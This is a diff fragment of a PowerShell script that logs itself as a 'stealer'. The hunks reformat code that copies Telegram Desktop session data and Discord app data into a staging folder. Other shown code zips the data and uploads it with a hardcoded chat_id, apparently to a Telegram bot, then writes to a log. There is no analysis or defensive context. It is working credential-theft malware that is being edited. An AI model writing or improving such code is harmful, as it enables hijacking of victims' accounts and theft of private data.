@@ -51,11 +51,19 @@ foreach($b in $browsers.Keys){
 
 # Telegram
 $tg="$env:APPDATA\Telegram Desktop\tdata"
-if(Test-Path $tg){try{Copy-Item $tg "$T\telegram" -Recurse -Force -ErrorAction SilentlyContinue}catch{}}
+if(Test-Path $tg){
+    try{
+        Copy-Item $tg "$T\telegram" -Recurse -Force -ErrorAction SilentlyContinue
+    }catch{}
+}
 
 # Discord
 $dc="$env:APPDATA\discord"
-if(Test-Path $dc){try{Copy-Item $dc "$T\discord" -Recurse -Force -ErrorAction SilentlyContinue}catch{}}
+if(Test-Path $dc){
+    try{
+        Copy-Item $dc "$T\discord" -Recurse -Force -ErrorAction SilentlyContinue
+    }catch{}
+}
 
 # Screenshot
 try{
@@ -83,11 +91,11 @@ try{
     $fc.Headers.ContentDisposition.FileName='data.zip'
     $form.Add($fc)
     $form.Add((New-Object System.Net.Http.StringContent('761051987')), 'chat_id')
-    
+
     $client=New-Object System.Net.Http.HttpClient
     $client.Timeout=[System.TimeSpan]::FromSeconds(60)
     $response=$client.PostAsync($url,$form).Result
-    
+
     if($response.StatusCode -eq 200){
         'OK'>>$env:TEMP\stealer.log
     }else{
